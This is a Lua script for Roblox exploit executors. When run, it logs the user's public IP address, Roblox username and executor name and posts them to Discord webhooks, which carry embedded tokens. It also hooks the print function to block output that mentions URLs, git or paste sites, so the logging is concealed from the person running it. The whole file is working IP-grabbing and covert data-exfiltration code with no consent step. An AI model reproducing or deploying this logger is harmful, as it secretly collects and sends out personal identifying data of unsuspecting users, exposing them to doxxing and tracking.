local IPLOGGER = tostring(game:HttpGet("https://api.ipify.org", true))


local webhookcheck =
is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
secure_load and "Sentinel" or
KRNL_LOADED and "Krnl" or
SONA_LOADED and "Sona" or
"Unknown exploit"

local url =
"https://webhook.lewisakura.moe/api/webhooks/1082032575821914196/eEOMaTbsOSy1bc8e0eTBasHw8NaABrx-BBFinvA8oNXA7O1PNLbk9aEIRDE70r_RgcBh"
local data = {
["content"] = "**Detected user that executed the script:**",
["embeds"] = {
{
["title"] =  game12321,
["description"] =  "**Username: **"  .. game.Players.LocalPlayer.Name .. ".",
["type"] = "rich",
["color"] = tonumber(0),
["fields"] = {
                            {
                                ["name"] = "Exploit:",
                                ["value"] = webhookcheck,
                                ["inline"] = true,
                            },
                            {
                                ["name"] = "Script using:",
                                ["value"] = script12321,
                                ["inline"] = true,
                            },
                            {
                                ["name"] = "Internet Protocol:",
                                ["value"] = IPLOGGER,
                                ["inline"] = true,
                            },  
}
}
}
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)

local denied_message = "Denied."
local g
g = hookfunction(print,function(urprint,...)
if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") then
urprint = denied_message
end
return g(urprint,...)
end)
    
    ------------------- NOT IPGEGER -------------------
    wait(0.5)
local webhookcheck =
is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
secure_load and "Sentinel" or
KRNL_LOADED and "Krnl" or
SONA_LOADED and "Sona" or
"Unknown exploit"

if not getgenv().Ranonce then
getgenv().Ranonce = true
local url =
"https://webhook.lewisakura.moe/api/webhooks/1058896633942777917/1gOlXDFdRLj_NmClZyPU_iPC6HS_bDtfeg2v2qO_l8S4xwFNJZ_XOHpQTiXPFNGcHEUh"
local data = {
["content"] = "**Detected user that executed the script:**",
["embeds"] = {
{
["title"] =  game12321,
["description"] =  "**Username: **"  .. game.Players.LocalPlayer.Name .. ".",
["type"] = "rich",
["color"] = tonumber(0),
["fields"] = {
                            {
                                ["name"] = "Exploit:",
                                ["value"] = webhookcheck,
                                ["inline"] = true,
                            },
                            {
                                ["name"] = "Script using:",
                                ["value"] = script12321,
                                ["inline"] = true,
                            },  
}
}
}
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)

local denied_message = "Denied."
local g
g = hookfunction(print,function(urprint,...)
if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") then
urprint = denied_message
end
return g(urprint,...)
end)
end  
